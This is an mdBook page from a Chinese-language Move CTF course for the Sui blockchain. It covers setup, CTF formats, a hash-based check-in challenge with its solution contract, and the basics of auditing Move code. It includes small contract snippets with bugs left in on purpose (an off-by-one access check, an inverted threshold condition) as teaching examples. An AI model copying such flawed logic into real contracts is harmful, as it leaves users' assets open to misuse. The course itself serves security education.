<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>lets move ctf</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">lets move ctf</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="前言"><a class="header" href="#前言">前言</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="课程目标与概述"><a class="header" href="#课程目标与概述">课程目标与概述</a></h1>
<h3 id="课程目标"><a class="header" href="#课程目标">课程目标</a></h3>
<p>欢迎参加 <strong>Move CTF 挑战课程</strong>！本课程旨在帮助你掌握 Move 编程语言在 CTF（Capture The Flag）比赛中的应用，培养分析代码和解决安全挑战的能力。通过八节课的学习，你将能够：</p>
<ul>
<li>熟练分析 Move 语言代码，识别常见漏洞和逻辑错误。</li>
<li>掌握 Move 在 CTF 中的典型题型，如整数溢出、资源管理和权限控制。</li>
<li>具备独立解决基础至中级 Move CTF 题目的能力。</li>
<li>为参加 Move 相关的 CTF 比赛做好准备，树立信心。</li>
</ul>
<p>无论你是区块链开发者、安全研究者还是 CTF 爱好者，本课程都将为你提供独特的视角，探索 Move 语言的安全特性及其在竞赛中的潜力。</p>
<h3 id="课程概述"><a class="header" href="#课程概述">课程概述</a></h3>
<ul>
<li><strong>课程结构</strong>：共八章节，从零开始进阶学习Move CTF。</li>
<li><strong>学习路径</strong>：
<ul>
<li>从 CTF 简介和基础代码审计开始，逐步深入到高级漏洞和综合挑战。</li>
<li>每节课聚焦一个主题，配备一道 CTF 题目，循序渐进提升难度。</li>
</ul>
</li>
<li><strong>前提假设</strong>：你已通过基础 Move 语言学习（ <a href="https://github.com/move-cn/letsmove">HOH社区Move共学</a>），熟悉基本语法、模块和资源概念。</li>
<li><strong>预期成果</strong>：完成课程后，你将能独立分析 Move 智能合约代码，解决 CTF 挑战，并具备参加真实比赛的基本策略。</li>
</ul>
<p>本课程结合理论与实践，鼓励动手操作和互动讨论。准备好迎接挑战了吗？让我们一起开启 Move CTF 的学习之旅！</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="预备知识与工具安装"><a class="header" href="#预备知识与工具安装">预备知识与工具安装</a></h1>
<h2 id="预备知识"><a class="header" href="#预备知识">预备知识</a></h2>
<p>为了顺利完成本课程，你需要具备以下基础知识：</p>
<ul>
<li><strong>Move 语言基础</strong>：
<ul>
<li>熟悉变量声明、基本数据类型（u8、u64、address 等）和控制流（if、while）。</li>
<li>理解模块（module）和资源（struct）的概念。</li>
<li>能够编写和运行简单的 Move 程序（如 Hello World）。</li>
<li>推荐资源：<a href="https://github.com/move-cn/letsmove">HOH社区Move共学</a> 或 <a href="https://move.sui-book.com/index.html">Sui Move Book</a>。</li>
</ul>
</li>
<li><strong>区块链基础</strong>：
<ul>
<li>了解智能合约的基本概念（如存储、交易）。</li>
<li>对 Sui 区块链平台有初步认识。</li>
</ul>
</li>
<li><strong>CTF 基础</strong>（可选）：
<ul>
<li>知道 CTF 比赛的基本形式将有助于更快上手。</li>
</ul>
</li>
</ul>
<p>如果以上知识点有欠缺，建议先完成基础学习再加入课程。本课程将直接聚焦 Move 在 CTF 中的应用，跳过语言基础教学。</p>
<h2 id="工具安装"><a class="header" href="#工具安装">工具安装</a></h2>
<p>以下是你需要安装的工具，确保在第一节课前配置好开发环境：</p>
<ol>
<li>
<p><strong>Sui CLI</strong>：</p>
<ul>
<li>用于编译、运行和调试 Move 代码。</li>
<li>安装步骤：
<ul>
<li>Sui：参考 <a href="https://docs.sui.io/build/cli-client">Sui CLI 安装指南</a>。</li>
</ul>
</li>
<li>验证：运行 <code>sui -V</code> 检查安装成功。</li>
</ul>
</li>
<li>
<p><strong>VS Code + Move 插件</strong>：</p>
<ul>
<li>
<p>提供代码高亮和语法检查。</p>
</li>
<li>
<p>安装步骤：</p>
<ol>
<li>下载 <a href="https://code.visualstudio.com/">VS Code</a>。</li>
<li>在扩展市场搜索 <code>Move</code> 或 <code>Sui Move</code>，安装相关插件。</li>
</ol>
<p><img src="ctfbook/preface/./prerequisites.assets/image-20250325171129301.png" alt="image-20250325171039560" /></p>
<p><code>Move</code> 和 <code>Move syntax</code> 插件为提供代码高亮和语法检查，<code>Move Formatter Developer Preview</code>插件提供代码格式化。</p>
</li>
</ul>
</li>
</ol>
<h3 id="环境验证"><a class="header" href="#环境验证">环境验证</a></h3>
<ul>
<li>运行以下命令测试环境：
<pre><code class="language-bash">sui move new &lt;path-to-move-project&gt; &amp;&amp; cd &lt;path-to-move-project&gt; &amp;&amp; sui move build
</code></pre>
</li>
<li>如果编译成功，说明环境配置正确。</li>
</ul>
<p>准备好这些工具后，你就可以无缝进入课程实践环节。遇到安装问题？请提前联系课程团队或查阅相关文档。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第1节ctf简介与move应用"><a class="header" href="#第1节ctf简介与move应用">第1节：CTF简介与Move应用</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ctf比赛类型与move应用场景"><a class="header" href="#ctf比赛类型与move应用场景">CTF比赛类型与Move应用场景</a></h2>
<p>欢迎来到 <strong>Move CTF 挑战课程</strong> 的第一节！本节将带你走进 CTF（Capture The Flag，夺旗赛）的世界，了解其主要比赛类型，并探索 Move 编程语言在 Sui 区块链上的 CTF 应用场景。通过理论与实践结合，你将迈出学习 Move CTF 的第一步。</p>
<h3 id="什么是ctf"><a class="header" href="#什么是ctf">什么是CTF？</a></h3>
<p>CTF 是一种网络安全竞赛形式，参与者通过解决技术挑战获取隐藏的 “flag”（通常是一串特定格式的字符串，如 <code>CTF{xxx}</code>），以证明他们的技能。CTF 起源于 1996 年的 DEFCON 安全大会，现已成为全球安全爱好者的热门活动。比赛类型主要分为以下两种：</p>
<h4 id="1-jeopardy模式"><a class="header" href="#1-jeopardy模式">1. Jeopardy模式</a></h4>
<ul>
<li><strong>特点</strong>：解题模式，参与者面对一系列独立题目，涵盖密码学、逆向工程、Web 安全、区块链等类别。</li>
<li><strong>流程</strong>：
<ul>
<li>题目提供线索（如代码片段、文件或服务器地址）。</li>
<li>选手分析问题，找到 flag 并提交。</li>
<li>根据解题数量和速度计分。</li>
</ul>
</li>
<li><strong>适合人群</strong>：初学者和个人选手，因其灵活性和低门槛广受欢迎。</li>
<li><strong>Move相关示例</strong>：分析一段 Sui 链上的 Move 智能合约代码，找出隐藏的 flag 或利用漏洞提取数据。</li>
<li><strong>真实案例</strong>：
<ul>
<li>在 <a href="https://ctftime.org/">CTFtime</a> 上，<a href="https://www.hackthebox.com/events/cyber-apocalypse-2024">HackTheBox Cyber Apocalypse CTF 2024 Blockchain Challenges</a> 包含区块链题目，要求选手审计智能合约。</li>
<li>Sui 社区在 2024 年推出了 <a href="https://movectf2024.movebit.xyz/">MoveCTF 2024</a>，其中包括基于 Move 的解题挑战。</li>
</ul>
</li>
<li><strong>现状</strong>：当前 Move CTF（如 justCTF、MoveCTF）主要采用 Jeopardy 模式，题目以代码审计和逻辑分析为主。</li>
</ul>
<h4 id="2-attack-defense模式"><a class="header" href="#2-attack-defense模式">2. Attack-Defense模式</a></h4>
<ul>
<li><strong>特点</strong>：攻防对抗模式，团队在虚拟环境中同时攻击对手服务并防御自身系统。</li>
<li><strong>流程</strong>：
<ul>
<li>每个团队维护一个包含漏洞的服务。</li>
<li>攻击对手以获取 flag，同时修补自身漏洞。</li>
<li>综合得分决定排名。</li>
</ul>
</li>
<li><strong>适合人群</strong>：进阶选手和团队，因其更接近真实网络攻防场景。</li>
<li><strong>Move相关示例</strong>：模拟 Sui 区块链网络，攻击对手的 Move 合约（如利用未授权访问漏洞窃取资源），同时保护自己的合约免受攻击。</li>
<li><strong>现状</strong>：目前 Move CTF 未见公开的攻防模式案例，更多聚焦于解题形式的挑战。</li>
</ul>
<h4 id="ctf的吸引力"><a class="header" href="#ctf的吸引力">CTF的吸引力</a></h4>
<ul>
<li><strong>技能提升</strong>：涵盖编程、逆向、安全分析等多领域。</li>
<li><strong>实战性</strong>：模拟真实安全场景，如区块链漏洞利用。</li>
<li><strong>趣味性</strong>：解题过程如同解谜，充满成就感。</li>
</ul>
<h3 id="move-在-ctf-中的应用"><a class="header" href="#move-在-ctf-中的应用">Move 在 CTF 中的应用</a></h3>
<p>Move 是由 Facebook（现 Meta）为 Diem 区块链设计的一种编程语言，后被 Sui 公链采用并优化。它以资源导向和类型安全著称，灵感来源于 Rust。在 Sui 生态中，Move 用于编写智能合约和去中心化应用（DApp）。以下是 Move 在 CTF 中的主要应用场景：</p>
<h4 id="1-智能合约漏洞挖掘"><a class="header" href="#1-智能合约漏洞挖掘">1. 智能合约漏洞挖掘</a></h4>
<ul>
<li><strong>背景</strong>：Sui 链上的 Move 合约是 CTF 题目的常见素材，选手需分析代码，寻找漏洞。</li>
<li><strong>常见考点</strong>：
<ul>
<li><strong>整数溢出/下溢</strong>：Move 未内置溢出检查，可能导致非法操作。例如，代币转移逻辑可能因溢出被绕过。</li>
<li><strong>逻辑错误</strong>：如条件判断失误，导致意外行为。</li>
</ul>
</li>
<li><strong>示例</strong>：假设一个 Move 代币合约未检查整数加法的溢出，选手可通过构造大额输入转移超出余额的代币，flag 可能隐藏在交易事件中。</li>
<li><strong>Move特点</strong>：Move 的类型系统减少了某些传统漏洞（如重入攻击），但仍需关注逻辑和边界问题。</li>
</ul>
<h4 id="2-资源管理挑战"><a class="header" href="#2-资源管理挑战">2. 资源管理挑战</a></h4>
<ul>
<li><strong>Move特性</strong>：Move 的资源（struct）具有线性类型特性，不可随意复制或丢弃，必须显式转移或销毁。这是 Sui 链上对象（Object）管理的核心机制。</li>
<li><strong>CTF应用</strong>：
<ul>
<li>题目可能涉及资源管理不当（如未销毁资源）导致的漏洞。</li>
<li>或通过资源转移逻辑的错误绕过限制。</li>
</ul>
</li>
<li><strong>示例</strong>：设想一个 Move 合约中，开发者忘记销毁旧资源，导致资源被重复使用，选手可利用此漏洞执行双重花费。</li>
</ul>
<h4 id="3-代码逻辑逆向"><a class="header" href="#3-代码逻辑逆向">3. 代码逻辑逆向</a></h4>
<ul>
<li><strong>背景</strong>：CTF 常要求选手理解代码意图，寻找隐藏信息。</li>
<li><strong>Move场景</strong>：
<ul>
<li>flag 可能藏在注释、变量名或 Sui 链上的事件输出中。</li>
<li>或通过复杂逻辑（如循环、条件）计算得出。</li>
</ul>
</li>
<li><strong>真实案例</strong>：在 justCTF 2024 Teaser 的“The Otter Scrolls”题目（<a href="https://2024.justctf.team/challenges/11">justCTF 2024</a>）中，选手需分析 Sui Move 合约 <code>Spellbook</code>，调用 <code>cast_spell</code> 函数并传入参数 <code>vector[1, 0, 3, 3, 3]</code>，触发 flag 输出。</li>
<li><strong>总结</strong>：Move 的资源导向和类型安全特性为 CTF 提供了独特的技术挑战，目前通过 Jeopardy 模式吸引爱好者参与并提升 Sui 生态的安全意识。</li>
</ul>
<h3 id="学习目标"><a class="header" href="#学习目标">学习目标</a></h3>
<p>通过本节课，你将：</p>
<ul>
<li>理解 CTF 比赛的基本形式（Jeopardy 和 Attack-Defense）。</li>
<li>认识 Move 在 Sui 链 CTF 中的应用场景。</li>
<li>通过实践，初步体验 Move 代码分析，迈出 CTF 第一步。</li>
</ul>
<p>准备好了吗？接下来，我们将通过一个简单实践，体验 Move CTF！</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="实践签到挑战"><a class="header" href="#实践签到挑战">实践：签到挑战</a></h1>
<h2 id="题目描述"><a class="header" href="#题目描述">题目描述</a></h2>
<p>在本实践环节，你将分析一个 Sui Move 签到合约，通过计算哈希值调用函数，获取隐藏的 flag。flag 是一个格式为 <code>CTF{xxx}</code> 的字符串，将在正确输入时通过事件输出。目标是体验 Move 代码分析和基本 CTF 解题流程。</p>
<h2 id="示例代码"><a class="header" href="#示例代码">示例代码</a></h2>
<p>以下是待分析的 Move 合约：</p>
<p>github: <a href="https://github.com/hoh-zone/lets-ctf/tree/main/src/ctfbook/chapter_1/challenge/chapter_1">chapter_1</a></p>
<pre><code class="language-move">module chapter_1::check_in {
    use std::string::{Self, String};
    use std::bcs;
    use std::hash::sha3_256;
    use sui::event;

    //testnet
    //PackageID:0x335297860a807291254b20f8a0dea30d72d5e17d2e6f8058e42d5b9c72f0f0ef
    public struct FlagEvent has copy, drop {
        sender: address,
        flag: String,
        success: bool
    }

    public entry fun get_flag(
        flag: vector&lt;u8&gt;,
        github_id: String,
        ctx: &amp;mut TxContext
    ) {
        let mut bcs_input = bcs::to_bytes(&amp;string::utf8(b"LetsMoveCTF"));
        vector::append&lt;u8&gt;(&amp;mut bcs_input, *github_id.as_bytes());
        let expected_hash = sha3_256(bcs_input);

        if (flag == expected_hash) {
            event::emit(FlagEvent {
                sender: tx_context::sender(ctx),
                flag: string::utf8(b"CTF{WelcomeToMoveCTF}"),
                success: true
            });
        } else {
            event::emit(FlagEvent {
                sender: tx_context::sender(ctx),
                flag: string::utf8(b"Try again!"),
                success: false
            });
        }
    }
}
</code></pre>
<h2 id="任务目标"><a class="header" href="#任务目标">任务目标</a></h2>
<p>阅读代码，理解哈希验证逻辑。</p>
<p>计算正确的 flag 输入并运行代码，获取 flag。</p>
<h2 id="解题思路"><a class="header" href="#解题思路">解题思路</a></h2>
<p>1、找到如何获取flag的代码块：</p>
<pre><code class="language-move">##其中 `flag == expected_hash` 为获取flag的条件
if (flag == expected_hash) {
    event::emit(FlagEvent {
        sender: tx_context::sender(ctx),
        flag: string(b"CTF{WelcomeToMoveCTF}"),
        success: true
    });
} else {
    event::emit(FlagEvent {
        sender: tx_context::sender(ctx),
        flag: string(b"Try again!"),
        success: false
    });
}
</code></pre>
<p>2、如何满足 <code>flag == expected_hash</code> 条件？</p>
<pre><code class="language-move">let mut bcs_input = bcs::to_bytes(&amp;string(b"LetsMoveCTF"));
vector::append&lt;u8&gt;(&amp;mut bcs_input, *github_id.as_bytes());
let expected_hash = sha3_256(bcs_input);
</code></pre>
<p>代码块中 expected_hash 为 <code>LetsMoveCTF</code> + 用户输入的<code>github_id</code> 转换为bytes然后sha3_256 进行编码，所以flag传入也需要是expected_hash的这个结果。</p>
<p>3、进行解题</p>
<p>这里采用的是合约的方式进行解题。</p>
<p>github: <a href="https://github.com/hoh-zone/lets-ctf/tree/main/src/ctfbook/chapter_1/challenge/solve_chapter_1">solve_chapter_1</a>
首先创建合约:</p>
<p><code>sui move new solve_chapter_1 &amp;&amp; cd solve_chapter_1</code></p>
<p>修改 <code>Move.toml</code> 文件导入题目合约,如果是本地与题目同目录则添加 <code>local</code> 方式:</p>
<pre><code>[package]
name = "solve_chapter_1"
edition = "2024.beta" # edition = "legacy" to use legacy (pre-2024) Move
# license = ""           # e.g., "MIT", "GPL", "Apache 2.0"
# authors = ["..."]      # e.g., ["Joe Smith (joesmith@noemail.com)", "John Snow (johnsnow@noemail.com)"]

[dependencies]
chapter_1 = { local = "../chapter_1" }

# For remote import, use the `{ git = "...", subdir = "...", rev = "..." }`.
# Revision can be a branch, a tag, and a commit hash.
# MyRemotePackage = { git = "https://some.remote/host.git", subdir = "remote/path", rev = "main" }

# For local dependencies use `local = path`. Path is relative to the package root
# Local = { local = "../path/to" }

# To resolve a version conflict and force a specific version for dependency
# override use `override = true`
# Override = { local = "../conflicting/version", override = true }

[addresses]
solve_chapter_1 = "0x0"

# Named addresses will be accessible in Move as `@name`. They're also exported:
# for example, `std = "0x1"` is exported by the Standard Library.
# alice = "0xA11CE"

[dev-dependencies]
# The dev-dependencies section allows overriding dependencies for `--test` and
# `--dev` modes. You can introduce test-only dependencies here.
# Local = { local = "../path/to/dev-build" }

[dev-addresses]
# The dev-addresses section allows overwriting named addresses for the `--test`
# and `--dev` modes.
# alice = "0xB0B"

</code></pre>
<p>然后编写解题合约 <code>solve_chapter_1.move</code>:</p>
<pre><code class="language-move">module solve_chapter_1::solve{
    use chapter_1::check_in::get_flag;
    use std::string;
    use std::bcs;
    use std::hash::sha3_256;

    //testnet
    //PackageID: 0xef6b4139ec1b0fda23e06c4a30c9e91150b72c38530e4517152e591001c5c433 
    public entry fun solve_get_flag(ctx: &amp;mut TxContext){
        let github_id = string::utf8(b"hoh-zone");
        let mut bcs_input = bcs::to_bytes(&amp;string::utf8(b"LetsMoveCTF"));
        vector::append&lt;u8&gt;(&amp;mut bcs_input, *github_id.as_bytes());
        let flag_hash = sha3_256(bcs_input);
        get_flag(flag_hash, github_id, ctx);  
    }
}
</code></pre>
<p>发布合约:</p>
<p><code>sui client publish</code></p>
<p>发布成功后调用合约：</p>
<pre><code class="language-bash">sui client call --package 0xef6b4139ec1b0fda23e06c4a30c9e91150b72c38530e4517152e591001c5c433 --module solve --function solve_get_flag
</code></pre>
<p>最终结果可以看到终端输出的Events内成功获取flag：</p>
<pre><code class="language-bash">╭───────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ Transaction Block Events                                                                              │
├───────────────────────────────────────────────────────────────────────────────────────────────────────┤
│  ┌──                                                                                                  │
│  │ EventID: EjQiJnPZRqen1TSSkNiUaRaEQYSmhshJYHctn3uUt1V5:0                                            │
│  │ PackageID: 0xef6b4139ec1b0fda23e06c4a30c9e91150b72c38530e4517152e591001c5c433                      │
│  │ Transaction Module: solve                                                                          │
│  │ Sender: 0x90abb670800b4015229d30f5d010faef0c347e1d9650c9acebe2c012be7eb724                         │
│  │ EventType: 0x335297860a807291254b20f8a0dea30d72d5e17d2e6f8058e42d5b9c72f0f0ef::check_in::FlagEvent │
│  │ ParsedJSON:                                                                                        │
│  │   ┌─────────┬────────────────────────────────────────────────────────────────────┐                 │
│  │   │ flag    │ CTF{WelcomeToMoveCTF}                                              │                 │
│  │   ├─────────┼────────────────────────────────────────────────────────────────────┤                 │
│  │   │ sender  │ 0x90abb670800b4015229d30f5d010faef0c347e1d9650c9acebe2c012be7eb724 │                 │
│  │   ├─────────┼────────────────────────────────────────────────────────────────────┤                 │
│  │   │ success │ true                                                               │                 │
│  │   └─────────┴────────────────────────────────────────────────────────────────────┘                 │
│  └──                                                                                                  │
╰───────────────────────────────────────────────────────────────────────────────────────────────────────╯
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第2节基础代码审计"><a class="header" href="#第2节基础代码审计">第2节：基础代码审计</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="阅读move代码与常见问题"><a class="header" href="#阅读move代码与常见问题">阅读Move代码与常见问题</a></h1>
<h2 id="阅读-move-代码与常见问题"><a class="header" href="#阅读-move-代码与常见问题">阅读 Move 代码与常见问题</a></h2>
<p>欢迎来到 <strong>Move CTF 挑战课程</strong> 的第二节！在第一节中，你通过一个签到挑战初步体验了 Move 代码的分析和解题流程。现在，我们将迈出审计的第一步，深入学习如何阅读 Move 代码并识别常见问题。本节将通过详细的理论讲解和实践环节，帮助你掌握基础审计技能，为后续更复杂的漏洞分析打下坚实基础。</p>
<h4 id="1-模块与函数"><a class="header" href="#1-模块与函数">1. 模块与函数</a></h4>
<ul>
<li><strong>模块（Module）</strong>：
<ul>
<li>Move 的代码组织单元，类似于传统语言中的合约或类。</li>
<li>格式：<code>module &lt;address&gt;::&lt;name&gt;</code>，其中 <code>&lt;address&gt;</code> 是部署地址（如 <code>0x1</code>），<code>&lt;name&gt;</code> 是模块名。</li>
<li>包含结构体、常量和函数，定义合约的逻辑。</li>
<li>示例：
<pre><code>module chapter_2_test::counter {

    public struct Counter has key {
        id: UID,
        count: u64,
    }

    fun init(ctx: &amp;mut TxContext){
        transfer::share_object(Counter { id:object::new(ctx), count: 0 });
        
    }

    public entry fun increment(counter: &amp;mut Counter) {
        counter.count = counter.count + 1;
    }
}
</code></pre>
</li>
</ul>
</li>
<li><strong>函数类型</strong>：
<ul>
<li><code>public entry fun</code>：外部可调用的入口函数，通常是 CTF 题目中的交互点，接受 <code>&amp;mut TxContext</code> 参数以获取交易上下文。</li>
<li><code>public fun</code>：公开函数，可被其他模块调用，但不直接作为交易入口。</li>
<li><code>fun</code>：私有函数，仅模块内部使用。</li>
<li>示例：
<pre><code>public entry fun set_value(value: u64, tx: &amp;mut TxContext) { 
    /* 交易入口 */ 
}
fun internal_add(a: u64, b: u64): u64 { a + b } // 内部辅助函数
</code></pre>
</li>
</ul>
</li>
</ul>
<h4 id="2-资源与所有权"><a class="header" href="#2-资源与所有权">2. 资源与所有权</a></h4>
<ul>
<li><strong>资源（Resource）</strong>：
<ul>
<li>Move 的核心特性，使用 <code>struct</code> 定义，带有能力（<code>has</code> 声明，如 <code>key</code>、<code>store</code>）。</li>
<li>线性类型：资源不可复制（<code>copy</code>）或丢弃（<code>drop</code>），必须显式转移或销毁。</li>
<li>示例：
<pre><code>public struct Coin has key {
    id: UID,
    value: u64  
}
</code></pre>
</li>
</ul>
</li>
<li><strong>所有权管理</strong>：
<ul>
<li>创建资源后，可通过 <code>transfer::transfer</code>（转移给地址）或 <code>transfer::share_object</code>（共享对象）等处理。</li>
<li>示例：
<pre><code>public entry fun create(ctx: &amp;mut TxContext){
    let coin = Coin { id: object::new(ctx), value: 100 };
    transfer::transfer(coin, tx_context::sender(ctx));
}
</code></pre>
</li>
<li>未处理资源会导致编译错误，确保所有权清晰。</li>
</ul>
</li>
<li><strong>Sui 特有机制</strong>：
<ul>
<li><strong>对象（Object）</strong>：通过 <code>UID</code>（唯一标识符）管理，Sui 的基本数据单元。</li>
<li><strong>共享对象</strong>：通过 <code>transfer::share_object</code> 创建，允许多人操作，常用于 CTF 的共享状态。</li>
</ul>
</li>
</ul>
<h4 id="3-事件与输出"><a class="header" href="#3-事件与输出">3. 事件与输出</a></h4>
<ul>
<li><strong>事件（Event）</strong>：
<ul>
<li>通过 <code>event::emit</code> 输出日志，用于记录状态变化或 CTF 中的 flag 输出。</li>
<li>需定义事件结构体，具备 <code>copy</code> 和 <code>drop</code> 能力。</li>
<li>示例：
<pre><code>public struct FlagEvent has copy, drop {
    sender: address,
    flag: vector&lt;u8&gt;
}

public entry fun get_flag(ctx: &amp;mut TxContext){
    event::emit(FlagEvent { sender: tx_context::sender(ctx), flag: b"CTF{example}" });
}
</code></pre>
</li>
<li>CTF 中，事件常是获取 flag 的关键途径。</li>
</ul>
</li>
</ul>
<h4 id="4-变量与类型"><a class="header" href="#4-变量与类型">4. 变量与类型</a></h4>
<ul>
<li><strong>基本类型</strong>：
<ul>
<li><code>u8</code>、<code>u64</code>、<code>u128</code>：无符号整数。</li>
<li><code>bool</code>：布尔值。</li>
<li><code>address</code>：账户地址。</li>
<li><code>vector&lt;T&gt;</code>：动态数组。</li>
</ul>
</li>
<li><strong>引用</strong>：
<ul>
<li><code>&amp;T</code>：不可变引用，用于读取。</li>
<li><code>&amp;mut T</code>：可变引用，用于修改。</li>
<li>示例：
<pre><code>public entry fun increment(counter: &amp;mut Counter) {
    counter.count = counter.count + 1;
}
</code></pre>
</li>
</ul>
</li>
</ul>
<h3 id="常见问题与漏洞类型"><a class="header" href="#常见问题与漏洞类型">常见问题与漏洞类型</a></h3>
<h4 id="1-未验证的输入"><a class="header" href="#1-未验证的输入">1. 未验证的输入</a></h4>
<ul>
<li><strong>影响</strong>：
<ul>
<li>若 <code>limit</code> 被设置为异常值（如 <code>2^64 - 1</code>），后续逻辑可能失效。</li>
<li>在 CTF 中，可能通过异常输入绕过限制或提取 flag。</li>
</ul>
</li>
</ul>
<h4 id="2-逻辑错误"><a class="header" href="#2-逻辑错误">2. 逻辑错误</a></h4>
<ul>
<li>
<p><strong>问题</strong>：条件判断、状态更新或流程控制错误，导致与设计意图不符的结果。</p>
</li>
<li>
<p><strong>详细说明</strong>：</p>
<ul>
<li>Move 依赖开发者正确实现逻辑，无内置保护机制。</li>
<li>常见于条件遗漏、顺序错误或判断反转。</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code>public struct AccessControl has key {
    id: UID,
    is_allowed: bool,
    threshold: u64
}

public entry fun check_access(access: &amp;mut AccessControl, score: u64) {
    if (score &gt; 50) { // 应为 &gt;= 50，但是设置为 &gt;50
        access.is_allowed = true;
    }
}
</code></pre>
</li>
<li>
<p>边界值 score = 50 被意外排除.</p>
</li>
<li>
<p><strong>更复杂示例</strong>：</p>
<pre><code>public entry fun update_state(state: &amp;mut AccessControl, value: u64) {
  if (value &lt; state.threshold) {
      state.is_allowed = false; // 可能应为 true
  }
}
</code></pre>
<ul>
<li>若意图是“低于阈值激活”，条件与赋值不符。</li>
</ul>
</li>
<li>
<p><strong>影响</strong>：</p>
<ul>
<li>可能允许未授权操作或阻止合法行为。</li>
</ul>
</li>
</ul>
